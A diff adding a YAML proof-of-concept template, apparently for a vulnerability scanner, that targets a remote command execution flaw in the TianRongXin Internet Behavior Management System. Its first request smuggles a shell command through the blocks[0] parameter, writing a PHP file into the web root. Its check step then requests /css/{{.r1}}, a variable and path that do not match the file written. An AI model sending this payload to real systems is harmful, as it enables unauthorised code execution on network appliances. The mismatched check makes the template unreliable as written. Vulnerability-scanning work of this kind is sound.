@@ -1,0 +1,24 @@
+id: poc-yaml-tianrongxin-internet-management-rce
+info:
+  name: TianRongXin Internet Behavior Management System 远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: TianRongXin
+  osprey-id: vb_2022_0094
+variables:
+  r_rand_str: random_str(6)
+requests:
+- method: GET
+  path: /view/IPV6/naborTable/static_convert.php?blocks[0]=;%20echo%20'%3C%3Fphp%20echo%20md5('admin');%3B%3F%3E'%20%3E%20%2Fvar%2Fwww%2Fhtml%2F{{.r_rand_str}}.php;
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  expression: 'status_code == 200
+
+    '
+- method: GET
+  path: /css/{{.r1}}
+  expression: 'status_code == 200 && contains(body, "21232f297a57a5a743894a0e4a801fc3")
+
+    '
+transport: http
